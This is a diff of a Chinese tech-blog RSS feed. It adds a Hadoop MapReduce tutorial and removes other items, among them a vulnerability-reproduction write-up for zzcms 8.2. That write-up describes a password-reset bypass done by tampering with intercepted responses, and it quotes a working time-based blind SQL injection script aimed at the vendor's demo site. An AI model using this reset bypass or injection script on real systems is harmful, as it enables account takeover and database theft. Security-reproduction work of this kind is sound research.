+<dc:identifier>http://www.cnblogs.com/ECJTUACM-873284962/p/8449346.html</dc:identifier>
+</item>
+<item>
+<title>深入浅出Hadoop之mapreduce - 卿哥聊技术</title>
+<link>http://www.cnblogs.com/huashao1985/p/8444198.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/huashao1985/p/8444198.html</guid>
+<description>&lt;p&gt;卿哥原创，转载请注明出处，谢谢&lt;/p&gt;
+&lt;p&gt;之前已经作出预告，那么今天就聊聊mapreduce，起源于Google的map reduce paper, 而后经历了mapreduce 1，和构建于yarn上的mapreduce 2，mapreduce1 除了提供一定的历史演变价值和了解一下mapreduce最初的设计之外就没有必要学了哈，毕竟现在意义上的mapreduce2,spark都是在yarn上。当然mapreduce这项技术本身可能现在也是逐年衰落，不是我说的，是michael stonebraker3年前就说了(stonebraker认为程序员只需要了解sql就行了，nosql啥的都应该直接或间接支持用sql来查询交互)，而且google自己也早就不用了，不过mapreduce还是有自身一定的学习价值，比如map, combiner, shuffle/sort, practiioner, reducer，消息传递, data locality(即把运算移动到数据旁，而不是传输数据来节省网络带宽提高运算效率)都是分布式系统运算框架的一个里程碑。很多分布式系统设计课程比如MIT研究生著名的分布式系统设计的前几章必然要讲mapreduce。&lt;/p&gt;
+&lt;h2&gt;分布式系统前言&lt;/h2&gt;
+&lt;p&gt;分布式系统由于包括很多node，所以它的根基是unreliable component包括node，network和clock，上层的设计必然需要考虑到这一点。Unreliable node有如下三种表现形式：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;fail-stop, 比如电力供应中断了（比如data center停电了，或者地震了发水灾了啥的），fail了就完了，无法恢复。&lt;/li&gt;
+&lt;li&gt;fail-recovery，比如node升级kernel，os，software，需要重启&lt;/li&gt;
+&lt;li&gt;拜占庭 failure，这个比较狠，就是这个node看似正常，但是你说城门楼子它说胯骨轴子，你说往东，它往西走。相当于一个神经错乱的node或者说是被入侵了的node。&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;同时分布式系统涉及大量的网络传输，不管是RPC还是RESTFUL都是走网络，网络也是unreliable的，有如下三种表现形式：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;完美传输，即%0 loss, 100% in order，俗称happy home，这个资源成本比较高，适用于特别重要的服务&lt;/li&gt;
+&lt;li&gt;fair-loss， 这个最为常见，就是正常丢包，不已传输内容为转移。TCP/IP就是为了解决这个事儿而设计了3 way handshake，retry，sliding window，congestion control啥的&lt;/li&gt;
+&lt;li&gt;拜占庭 failure，这个就基本相当于被man in the middle 了，anything is possible，good luck ：）思考题：SSL/TLS 能有效解决man in the middle吗？&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;还没完，分布式系统还有一个问题就是clock，一方面每台机器的时间都可能不一样，俗称clock skew，另一方面，每台机器对每一秒的感知也不一样，俗称clock drift。所以伟大的lamport（2013图灵奖得主，分布式大神，latex，vector clock，paxos，etc）发明了logical clock，其中最著名的是vector clock。相当于让每个event有了自己的先后顺序。这个可以单独聊一次它的具体原理。插一句嘴，我觉得分布式系统这么多年敢称大神的只有两个，理论大师lamport和实战天王Jeff Dean（Jeff Dean当年在MIT淡定的给我们介绍谷歌分布式系统设计经验，然后说自己一个周末现学maching learning，搞出了个猫图片识别，当时我就在想他学machine learning干啥，然后tensor flow这个项目就横空出世了。。。orz）&lt;/p&gt;
+&lt;p&gt;还有就是分布式系统实现分为synchronous和asynchronous两种model，synchronous就是blocking callback with optional timeout，asynchronous就是event call back with optional timeout。&lt;/p&gt;
+&lt;p&gt;下面我们把以上几种情形组合一下：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;fail-stop + 完美传输 + synchronous，比如超级计算机每个processor由local high speed bus相连，user case是OpenMP 和 MPI&lt;/li&gt;
+&lt;li&gt;fail-recovery + fair-loss + asynchronous，就是我们最近一直聊的hadoop eco system了&lt;/li&gt;
+&lt;li&gt;拜占庭 node + 拜占庭网络+asynchronous，这就是分布于untrusted computer和untrusted network之中的grid computing了&lt;/li&gt;
+&lt;/ul&gt;&lt;h2&gt;map&lt;/h2&gt;
+&lt;p&gt;先看一下python的map function，接下来会聊hadoop streaming&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; map(&lt;span&gt;lambda&lt;/span&gt; x: x*x, [1,2,3,4,5&lt;span&gt;])
+[&lt;/span&gt;1, 4, 9, 16, 25&lt;span&gt;]
+
+&lt;/span&gt;&lt;span&gt;or&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; items = (1,2,3,4,5&lt;span&gt;)
+
+&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;def&lt;/span&gt; sqr(x): &lt;span&gt;return&lt;/span&gt; x**2&amp;gt;&amp;gt;&amp;gt;&lt;span&gt; map(sqr,items)
+
+[&lt;/span&gt;1, 4, 9, 16, 25]
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213121837249-1097413346.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;h2&gt;reduce&lt;/h2&gt;
+&lt;p&gt;先看一下python的reduce function&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
+&lt;pre&gt;
+&amp;gt;&amp;gt;&amp;gt; reduce(operator.iadd, [1,4,9,16,25&lt;span&gt;])
+&lt;/span&gt;55
+
+&lt;span&gt;or&lt;/span&gt;
+
+&amp;gt;&amp;gt;&amp;gt; reduce(&lt;span&gt;lambda&lt;/span&gt; x,y: x+y, [1,4,9,16,25&lt;span&gt;])
+&lt;/span&gt;55
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213121907593-417725471.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;h2&gt;data flow&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213121949046-200523279.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213122026093-2014903548.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt; map 和 reduce的input／output都是key／value pair。注意map或者reduce不一定都需要，比如grep，map=grep，reduce=None&lt;/p&gt;
+&lt;p&gt;在sort和shuffling阶段，sorting用的是external sorting，所以不用担心内存爆了。&lt;/p&gt;
+&lt;h2&gt;实现&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213123027124-1408757386.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;上图中，intermidiate result是存放在local disk中而不是HDFS，因为就算丢了，也可以通过map重新得到，所以不用使用HDFS做multiple copy。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213123934234-2047291459.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213124336593-785186105.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213124841046-449167839.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213131038452-2139242765.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;上图可以看出yarn分为resource manager和node manager，resource manager会launch application master，application master会请求resource根据resource富余程度launch application process。&lt;/p&gt;
+&lt;p&gt;下面这张图也是这个意思：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213131235531-1267878909.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;具体来说，input data会被Hadoop切割为固定大小的input splits，Hadoop 会为每个split creates一个map task，map task会对split中的每一个record运行user-defined map function. 对于大部分job来说，a good split size是一个HDFS block，128MB。Hadoop尽量通过data locality optimization来让map task运行在存有input data的节点上。如果不行，就选择同一个rack上的其它node，如果还不行，就选择旁边rack上的node。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1321773/201802/1321773-20180213132145171-713086697.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;reduce就没有data locality一说了，input都是通过网络传过去的。这中间还会有一个shuffle&amp;amp;&amp;amp;sort的过程，通常就是通过一个hash function来把相同的key放在一起，保证对于每一个given key来说，所有的records都在一个partition里。所以当reducer处理的时候可以保证input data都是按照key sorting好的了。&lt;/p&gt;
+&lt;h2&gt;Hadoop Streaming&lt;/h2&gt;
+&lt;p&gt;首先，说说distributed cache, 比如你有个文件需要在运算的时候用到如何传给map／reduce task呢？答，是通过-files／-archives／-libjars 传过去的，比如-files mapper.py, reducer.py, some_file.txt, 此时some_file.txt会被传到需要的node上，每个node只需要一个copy，注意some_files.txt是read only的，所以可以被tasks共享。 archives是打包传输，libjars是传jar格式。&lt;/p&gt;
+&lt;p&gt;following method 可以创建archive文件：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+tar -cf pack.tar a.txt b.txt c.txt
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;读的时候就用如下path：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
+&lt;pre&gt;
+pack.tar/a.txt，pack.tar/b.txt, pack.tar/c.txt
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;其次，说说environment variable, hadoop streaming可以通过-D some_var=&quot;some value&quot;的方式把变量传给nodes。&lt;/p&gt;
+&lt;p&gt;第三，从task的角度可以通过reporter:status: 的方式把report传回去。&lt;/p&gt;
+&lt;p&gt;下面举个word count的实际例子，比如统计wikipedia的word count：&lt;/p&gt;
+&lt;p&gt;mapper.py&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/python&lt;/span&gt;
+
+&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys
+&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
+
+reload(sys)
+sys.setdefaultencoding(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; required to convert to unicode&lt;/span&gt;
+
+&lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; sys.stdin:
+    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
+        article_id, text &lt;/span&gt;= unicode(line.strip()).split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 1&lt;span&gt;)
+    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ValueError as e:
+        &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;
+    words &lt;/span&gt;= re.split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\W*\s+\W*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, text, flags=&lt;span&gt;re.UNICODE)
+    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; word &lt;span&gt;in&lt;/span&gt;&lt;span&gt; words:
+        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s\t%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; % (word.lower(), 1)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;reducer.py&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/python&lt;/span&gt;
+
+&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys
+
+current_key &lt;/span&gt;=&lt;span&gt; None
+word_sum &lt;/span&gt;=&lt;span&gt; 0
+
+&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; line &lt;span&gt;in&lt;/span&gt;&lt;span&gt; sys.stdin:
+    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
+        key, count &lt;/span&gt;= line.strip().split(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\t&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, 1&lt;span&gt;)
+        count &lt;/span&gt;=&lt;span&gt; int(count)
+    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ValueError as e:
+        &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;
+    &lt;span&gt;if&lt;/span&gt; current_key !=&lt;span&gt; key:
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; current_key:
+            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s\t%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; (current_key, word_sum)
+        word_sum &lt;/span&gt;=&lt;span&gt; 0
+        current_key &lt;/span&gt;=&lt;span&gt; key
+    word_sum &lt;/span&gt;+=&lt;span&gt; count
+
+&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; current_key:
+    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s\t%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; % (current_key, word_sum)
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;本机运行：&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+cat wiki.txt | ./mapper.py | sort | ./reducer.py
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Hadoop streaming:&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
+&lt;pre&gt;
+OUT_DIR=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;wiki_wordcount_result_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;$(&lt;span&gt;date&lt;/span&gt; +&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%s%6N&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
+NUM_REDUCERS&lt;/span&gt;=&lt;span&gt;8&lt;/span&gt;&lt;span&gt;
+
+hdfs dfs &lt;/span&gt;-&lt;span&gt;rm&lt;/span&gt; -r -skipTrash ${OUT_DIR} &amp;gt; /dev/&lt;span&gt;null&lt;/span&gt;&lt;span&gt;
+
+yarn jar &lt;/span&gt;/opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/hadoop-&lt;span&gt;streaming.jar \
+    &lt;/span&gt;-D mapred.jab.name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Streaming wordCount&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; \
+    &lt;/span&gt;-D mapreduce.job.reduces=&lt;span&gt;${NUM_REDUCERS} \
+    &lt;/span&gt;-&lt;span&gt;files mapper.py,reducer.py \
+    &lt;/span&gt;-mapper &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;python mapper.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; \
+    &lt;/span&gt;-combiner &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;python reducer.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; \
+    &lt;/span&gt;-reducer &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;python reducer.py&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; \
+    &lt;/span&gt;-input /wiki/&lt;span&gt;en_articles_part \
+    &lt;/span&gt;-output ${OUT_DIR} &amp;gt; /dev/&lt;span&gt;null&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;好了，今天就写到这，happy mapreduce！&lt;/p&gt;
+
+</description>
+<pubDate>Thu, 15 Feb 2018 03:22:00 +0000</pubDate>
+<dc:creator>卿哥聊技术</dc:creator>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/huashao1985/p/8444198.html</dc:identifier>
+</item>
+<item>
 <title>redux简明学习 - 小火柴的蓝色理想</title>
 <link>http://www.cnblogs.com/xiaohuochai/p/8447826.html</link>
 <guid isPermaLink="true" >http://www.cnblogs.com/xiaohuochai/p/8447826.html</guid>
@@ -784,100 +1863,6 @@ export &lt;/span&gt;&lt;span&gt;default&lt;/span&gt; createStore(rootReducer,app
 <dc:language>zh-cn</dc:language>
 <dc:format>text/html</dc:format>
 <dc:identifier>http://www.cnblogs.com/hellocwh/p/8449133.html</dc:identifier>
-</item>
-<item>
-<title>[漏洞复现]zzcms8.2#任意用户密码重置#del.php时间盲注#复现 - ch1st</title>
-<link>http://www.cnblogs.com/ak47boom/p/8449120.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/ak47boom/p/8449120.html</guid>
-<description>&lt;p&gt;　　早上起来,发现seebug更新了一批新的洞,&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214114149577-817953837.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　 发现zzcms8.2这个洞好多人在挖,于是我就默默的踏上了复现之路(要不是点进去要买详情,我何必这么折腾~)&lt;/p&gt;
-&lt;p&gt;　　 环境:zzcms8.2(产品招商型)&lt;/p&gt;
-&lt;p&gt;　　　　 php-5.4.45&lt;/p&gt;
-&lt;p&gt;.　　　　mysql-5.5.53&lt;/p&gt;
-
-&lt;h2&gt;　　01x1 任意用户密码重置方式一&lt;/h2&gt;
-&lt;p&gt;　　　　话说,这个洞的标题应该是任意前台用户密码重置,后台管理员重置不了的,或许是我复现的问题.~~&lt;/p&gt;
-&lt;p&gt;　　　　先注册个账号,然后首页点击找回密码.&lt;/p&gt;
-&lt;p&gt;　　　　地址:http://localhost/one/getpassword.php&lt;/p&gt;
-&lt;p&gt;　　　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214120045593-600353779.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　　　　　这里还存在用户遍历,如果存在该用户,那么返回在前端页面的就是如上所述的正确的状态&lt;/p&gt;
-&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214120309546-1537216750.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;　　　　　　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214120249952-1846002722.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　　　　　回到主题,输入验证码后点击下一步,进入下一个状态.&lt;/p&gt;
-&lt;p&gt;　　　　　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214121526577-651652682.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-
-&lt;p&gt;　　不用点击获取验证码,随意输入任意数字,直接点击下一步,抓包&lt;/p&gt;
-&lt;p&gt;　　             &lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214121505374-407067188.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;      获取响应包&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214121657062-1171173910.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;　　把no改为yes,然后forward,到这里你会发现前端页面没什么变化&lt;/p&gt;
-&lt;p&gt;　　再看抓包工具,你会看到这个包&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214122050218-596044379.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;     这个明显就是验证码成功的包,直接forward.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214122140609-1204222431.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;输入新密码,直接重置.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214122203234-1963666093.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214122219499-1523268917.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;重置成功&lt;/p&gt;
-&lt;h2&gt;01x2 任意用户密码重置方式二&lt;/h2&gt;
-&lt;p&gt;　　这个,是最简单的,根本不用抓包.&lt;/p&gt;
-&lt;p&gt;　　拿demo站做测试.&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123056187-1558268887.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;下一步,&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123121406-919764135.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;会看到,这个,然后不用选择验证方式,不用点击获取验证码,随便输入任意数字,直接点击下一步.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123301265-586836212.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;一定快速输入,不然会发包后端会做验证,在显示&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123350202-2122404055.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;这样的红色警告字符之前点击下一步&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123418140-1673157957.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;直接跳转到修改密码处,&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123606187-1906130575.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123632874-1034307994.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214123652249-786882223.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;h2&gt; &lt;/h2&gt;
-
-&lt;p&gt;这个在freebuf被某个师傅发出来过,我这就做简单的分析&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/vuls/161888.html&quot; target=&quot;_blank&quot;&gt;http://www.freebuf.com/vuls/161888.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;user/del.php 13行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214124102046-820286597.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;这里两个post参数都是未做处理,传进来之后直接格式化了.&lt;/p&gt;
-&lt;p&gt;再到136行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/1298418/201802/1298418-20180214124209952-797068270.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;直接带入查询了.贴上大牛的poc&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
-&lt;pre&gt;
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-import&lt;span&gt; requests
-import&lt;span&gt; time
-
-payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
-url = &quot;http://demo.zzcms.net/user/del.php&quot;&lt;span&gt;
-user = ''
-for i in range(1, 2&lt;span&gt;):
-        for payload in payloads:    #遍历取出字符
-                startTime =&lt;span&gt; time.time()
-                post_data = &quot;id=1&amp;amp;tablename=zzcms_answer where id = 1 and if((ascii(substr(user(),1,1))=&quot; + str(ord(payload)) + &quot;),sleep(5),1)%23&quot;.encode(&quot;utf-8&quot;&lt;span&gt;)
-                response = requests.post(url, timeout=6, data=post_data, headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&lt;span&gt;}  )
-if time.time() - startTime &amp;gt; 5&lt;span&gt;:
-                        user =&lt;span&gt; payload
-print 'user is:'&lt;span&gt;, user
-break
-print '\n[Done] current user is %s' % user&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-</description>
-<pubDate>Wed, 14 Feb 2018 15:52:00 +0000</pubDate>
-<dc:creator>ch1st</dc:creator>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/ak47boom/p/8449120.html</dc:identifier>
 </item>
 <item>
 <title>瀑布流知识的延伸 - 决起而飞</title>
@@ -2442,1448 +3427,6 @@ Exception in thread &quot;main&quot; org.msgpack.MessageTypeException: Expected 
 <dc:language>zh-cn</dc:language>
 <dc:format>text/html</dc:format>
 <dc:identifier>http://www.cnblogs.com/sunzhenchao/p/8448929.html</dc:identifier>
-</item>
-<item>
-<title>AJAX面试题都在这里 - Java3y</title>
-<link>http://www.cnblogs.com/Java3y/p/8448921.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/Java3y/p/8448921.html</guid>
-<description>&lt;h2 id=&quot;什么是ajax为什么要使用ajax&quot;&gt;什么是AJAX，为什么要使用Ajax&lt;/h2&gt;
-&lt;p&gt;AJAX是“Asynchronous JavaScript and XML”的缩写。他是指一种&lt;strong&gt;创建交互式网页应用的网页开发技术&lt;/strong&gt;。、&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;客户端与服务器，可以在【不必刷新整个浏览器】的情况下，与服务器进行异步通讯的技术&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&quot;ajax应用和传统web应用有什么不同&quot;&gt;AJAX应用和传统Web应用有什么不同？&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;AJAX应用和传统Web应用有什么不同？&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;&lt;li&gt;传统的web前端与后端的交互中，浏览器直接访问Tomcat的Servlet来获取数据。&lt;strong&gt;Servlet通过转发把数据发送给浏览器&lt;/strong&gt;。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;当我们使用AJAX之后&lt;/strong&gt;，浏览器是先把请求发送到XMLHttpRequest异步对象之中，异步对象对请求进行封装，然后再与发送给服务器。&lt;strong&gt;服务器并不是以转发的方式响应，而是以流的方式把数据返回给浏览器&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;XMLHttpRequest异步对象会不停监听服务器状态的变化，得到服务器返回的数据，就写到浏览器上【因为不是转发的方式，所以是无刷新就能够获取服务器端的数据】&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170517180715420?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
-&lt;h2 id=&quot;请介绍一下xmlhttprequest对象&quot;&gt;请介绍一下XMLhttprequest对象&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;请介绍一下XMLhttprequest对象&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Ajax的核心是JavaScript对象XmlHttpRequest。该对象在Internet Explorer 5中首次引入，它是一种支持异步请求的技术。简而言之，&lt;strong&gt;XmlHttpRequest使您可以使用JavaScript向服务器提出请求并处理响应，而不阻塞用户。通过XMLHttpRequest对象，Web开发人员可以在页面加载以后进行页面的局部更新&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&quot;介绍一下xmlhttprequest对象的常用方法和属性&quot;&gt;介绍一下XMLHttpRequest对象的常用方法和属性&lt;/h2&gt;
-&lt;h3 id=&quot;方法&quot;&gt;&lt;strong&gt;方法&lt;/strong&gt;&lt;/h3&gt;
